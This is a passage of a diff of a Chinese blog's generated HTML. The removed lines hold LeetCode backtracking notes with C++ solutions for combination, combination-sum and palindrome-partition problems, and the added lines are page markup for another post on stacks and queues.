+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
-<p>对于回溯问题要多画递归调用树    </p>
-<h2 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h2><h3 id="去重"><a href="#去重" class="headerlink" title="去重:"></a>去重:</h3><ol>
-<li>树层去重用set,如果数组有序并且每一层的起始位置都不相同则可以在i&gt;startindex的情况下和前一个元素比较</li>
-<li>树枝去重用used数组,跟着path一起回溯即可</li>
-</ol>
-<h4 id="77-组合"><a href="#77-组合" class="headerlink" title="77. 组合"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/combinations/">77. 组合</a></h4><p>很经典的回溯题目,组合的话每次从i+1开始</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combine</span>(<span class="keyword">int</span> n, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(n, k, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt;= n; i++) &#123;</span><br><span class="line"></span><br><span class="line">            path.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">backTracking</span>(n, k, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-<p>可以在for循环前附加一步剪枝操作,当剩余的元素加上已经进入path的元素数量不足k个时直接break</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(path.<span class="built_in">size</span>()+n-i+<span class="number">1</span>&lt;k)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
 
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="post-title-link" itemprop="url">栈和队列</a>
+        </h2>
 
-<h4 id="216-组合总和-III"><a href="#216-组合总和-III" class="headerlink" title="216. 组合总和 III"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III</a></h4><p>类似于上一题</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum3</span>(<span class="keyword">int</span> k, <span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(k, n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> n, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() &gt; k || sum &gt; n) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum == n &amp;&amp; path.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            path.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">backTracking</span>(k, n, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
 
-<p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></p>
-<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409282052528.png" alt="image-20240928163330081" style="zoom:80%;" />
+              <time title="创建时间：2024-09-28 20:51:00 / 修改时间：21:25:00" itemprop="dateCreated datePublished" datetime="2024-09-28T20:51:00+08:00">2024-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
 
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, string&gt; mp = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;abc&quot;</span>&#125;, &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;def&quot;</span>&#125;,  &#123;<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;ghi&quot;</span>&#125;, &#123;<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jkl&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;mno&quot;</span>&#125;, &#123;<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;pqrs&quot;</span>&#125;, &#123;<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;tuv&quot;</span>&#125;, &#123;<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    string path;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCombinations</span><span class="params">(string digits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (digits == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">backTracking</span>(digits, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string digits, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">length</span>() == digits.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; digits.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mp[digits[i]].<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">                path.<span class="built_in">push_back</span>(mp[digits[i]][j]);</span><br><span class="line">                <span class="built_in">backTracking</span>(digits, i + <span class="number">1</span>);</span><br><span class="line">                path.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+          
+            <span id="/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="post-meta-item leancloud_visitors" data-flag-title="栈和队列" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
 
-<p>但是上面的代码虽然结果对了,for循环有问题,上面代码的意思是让每个数字对应的字母都当头去尝试了,但事实上只需要第一个数字的字母打头</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, string&gt; mp = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;abc&quot;</span>&#125;, &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;def&quot;</span>&#125;,  &#123;<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;ghi&quot;</span>&#125;, &#123;<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jkl&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;mno&quot;</span>&#125;, &#123;<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;pqrs&quot;</span>&#125;, &#123;<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;tuv&quot;</span>&#125;, &#123;<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    string path;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCombinations</span><span class="params">(string digits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (digits == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">backTracking</span>(digits, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string digits, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">length</span>() == digits.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mp[digits[index]].<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">            path.<span class="built_in">push_back</span>(mp[digits[index]][j]);</span><br><span class="line">            <span class="built_in">backTracking</span>(digits, index + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+        </div>
+      </header>
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
-
-<h4 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title="39. 组合总和"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/combination-sum/">39. 组合总和</a></h4><p>这题是组合问题,组合切忌不能走回头路,元素能重复出现,它也只能继续从自己开始,不能从前面开始</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; candidates.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 需要树层去重</span></span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(candidates, target, i);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="40-组合总和-II"><a href="#40-组合总和-II" class="headerlink" title="40. 组合总和 II"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/combination-sum-ii/">40. 组合总和 II</a></h4><p>这题的去重也很有意思,要树层去重就先排序,(它是树层去重,也就是同一层不能包含和之前访问过的值相同的元素)</p>
-<p><strong>为什么要去重?</strong></p>
-<p>因为排序过后连续相同元素,前一个元素的所以情况肯定包含了后一个元素的所有情况,所以后一个元素的情况直接舍弃</p>
-<h5 id="set去重"><a href="#set去重" class="headerlink" title="set去重"></a>set去重</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum2</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; candidates.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (st.<span class="built_in">count</span>(candidates[i])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">insert</span>(candidates[i]);</span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用组合的关系去重"><a href="#利用组合的关系去重" class="headerlink" title="利用组合的关系去重"></a>利用组合的关系去重</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum2</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; candidates.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; startIndex &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(candidates, target, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="131-分割回文串"><a href="#131-分割回文串" class="headerlink" title="131. 分割回文串"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/palindrome-partitioning/">131. 分割回文串</a></h4><p>本题中startIndex就是每次的切割符,在for循环中检查本次切割是否有效,无效则放弃这条树枝</p>
-<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409282052774.png" alt="image-20240928173437573"></p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;string&gt; part;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">partition</span>(string s) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(s, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string s, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (startIndex == s.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(part);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            string temp = s.<span class="built_in">substr</span>(startIndex, i - startIndex + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isValid</span>(temp)) &#123;</span><br><span class="line">                part.<span class="built_in">push_back</span>(temp);</span><br><span class="line">                <span class="built_in">backTracking</span>(s, i + <span class="number">1</span>);</span><br><span class="line">                part.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            